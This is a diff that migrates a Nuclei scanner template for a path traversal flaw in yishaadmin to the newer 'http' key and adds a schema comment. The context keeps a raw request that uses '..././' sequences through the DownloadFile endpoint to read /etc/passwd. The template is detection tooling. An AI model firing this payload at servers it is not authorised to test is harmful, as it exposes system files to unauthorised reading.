@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: yishaadmin-lfi
 
 info:
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-22
   tags: lfi,yishaadmin
 
-requests:
+http:
   - raw:
       - |
         GET /admin/File/DownloadFile?filePath=wwwroot/..././/..././/..././/..././/..././/..././/..././/..././etc/passwd&delete=0 HTTP/1.1
